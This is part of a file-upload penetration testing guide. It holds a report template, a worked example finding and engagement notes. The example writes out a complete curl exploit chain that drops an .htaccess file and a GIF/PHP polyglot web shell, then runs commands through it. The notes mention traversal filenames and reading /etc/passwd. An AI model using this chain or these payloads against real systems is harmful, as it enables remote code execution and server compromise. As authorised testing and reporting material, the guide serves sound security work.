- **Bypass family that worked**: which Phase 2 sub-step succeeded; which sub-steps were tried and rejected
- **Cross-channel coverage**: which sibling upload routes share the bug and which are hardened
- **Impact tier**: Level 1-4 from the section above
- **Affected actors / tenants**: scope (single user, single tenant, every uploader, every viewer of served files)
- **Recommended fix**: server-side magic-byte inspection paired with strict extension allowlist; transform risky formats (SVG -> PNG re-render, PDF -> rasterise) instead of sanitising; sign every header in presigned uploads (`Content-Type`, `Content-Disposition`, `key`, `acl`); always serve user uploads from a dedicated, sandboxed, cookie-less domain with `Content-Disposition: attachment` plus `X-Content-Type-Options: nosniff`; lock down ImageMagick `policy.xml`, disable Ghostscript `%pipe%`, pin ExifTool to a patched release; reject zip entries with `..` or symlinks before extraction; re-validate auth and metadata at every step of resumable / multipart protocols; gate access to uploaded files until AV / CDR returns a verdict.

### Example Finding

```
## Insecure File Upload: PHP shell via .htaccess drop on avatar endpoint

**Vulnerability class:** Config-file drop -> RCE
**Affected endpoint:** POST https://target.tld/api/users/me/avatar (multipart/form-data, parameter `file`)
**Pipeline topology:** App writes to /var/www/uploads/<userid>/, served by Apache from the same vhost.
**Triggering request:**
  Step 1: drop .htaccess
    curl -sk -X POST https://target.tld/api/users/me/avatar \
      -H "Authorization: Bearer [TOKEN]" \
      -F "file=@/tmp/.htaccess;type=text/plain"
  Step 2: drop the paired payload
    curl -sk -X POST https://target.tld/api/users/me/avatar \
      -H "Authorization: Bearer [TOKEN]" \
      -F "file=@/tmp/avatar.png;filename=avatar.png;type=image/png"
    (avatar.png contains: GIF89a; <?php echo shell_exec($_GET["c"]); ?>)
  Step 3: reach the shell
    curl -sk "https://target.tld/uploads/42/avatar.png?c=id"
    -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
**Served response:** 200 OK, Content-Type: image/png, no Content-Disposition, no X-Content-Type-Options.
**Proof of impact:** Command execution as www-data; environment leak via ?c=env.
**Bypass family that worked:** 2.4 config drop. Attempts 2.1 (raw .php), 2.2 (extension rotation), 2.3 (polyglot only) were rejected by the extension allowlist before the .htaccess drop flipped .png into PHP.
**Cross-channel coverage:** Same bug on POST /api/teams/{id}/logo; admin importer at /admin/import strips dotfiles correctly.
**Impact tier:** Level 4 (CRITICAL). RCE in the application web context.
**Affected actors / tenants:** Every authenticated user with an avatar.
**Recommended fix:** Reject uploads whose filename starts with `.`; serve uploaded files from a separate origin without an Apache PHP handler; constrain `AllowOverride None` on the upload directory.
```

## Important Notes

- **Coordinate destructive proofs.** Web shells, dropped configs, and bucket-prefix breaks are state-changing. Confirm the engagement scope before firing them in shared environments and clean up every artifact afterward.
- **Polyglots are the most reliable bypass.** A file that genuinely passes both magic-byte and extension validators looks indistinguishable from a benign upload. Prefer polyglots over single-trick bypasses when the validator stack is unknown.
- **Never confuse "accepted" with "executed".** A 200 OK on the upload only matters once the served URL produces execution, render, or disclosure. Always re-fetch the served URL with the same `Accept` headers a real browser would send.
- **Watch the served origin.** Files served from a dedicated cookie-less origin with `Content-Disposition: attachment` and `nosniff` are typically not stored-XSS hits even if the byte content is hostile. The header set decides the outcome.
- **Check the async tail.** Many findings only surface after the background processor runs. After every accepted upload, wait the observed processor latency from Phase 1 and re-fetch the served URL before declaring no impact.
- **Respect AV scope.** Use EICAR for AV-bypass probes; do not upload real malware unless the engagement explicitly authorises it. Live-fire payloads against shared or production CDNs are usually out of scope.
- **OOB callbacks may be blocked.** If the operator forbids external callbacks, replace 2.6's interactsh-driven proofs with reflective probes (timing differences, error-message diffs) and Phase 3.4's playwright render proof. Document the constraint in the report.
- **Prefer non-destructive proofs of impact.** Reading `/etc/passwd` or `id` is enough to prove RCE; you do not need to drop a persistent backdoor or move laterally to make the report land.
- **Filename traversal stays here, parameter traversal does not.** A `?file=../../etc/passwd` request belongs in path_traversal. A multipart `filename=../../shell.php` belongs here, because the bug lives in the upload sink.
- **References for triage and write-ups:** OWASP File Upload Cheat Sheet, PortSwigger Web Security Academy "File upload vulnerabilities" labs, HackerOne reports on Shopify, Snapchat, GitLab, Gitea, and PayPal upload bugs, Orange Tsai's research on storage-CDN abuse, the ImageTragick advisory family (CVE-2016-3714 and follow-ups), Ghostscript `%pipe%` advisories (CVE-2018-16509, CVE-2019-6116, CVE-2023-36664), ExifTool argument injection (CVE-2021-22204).
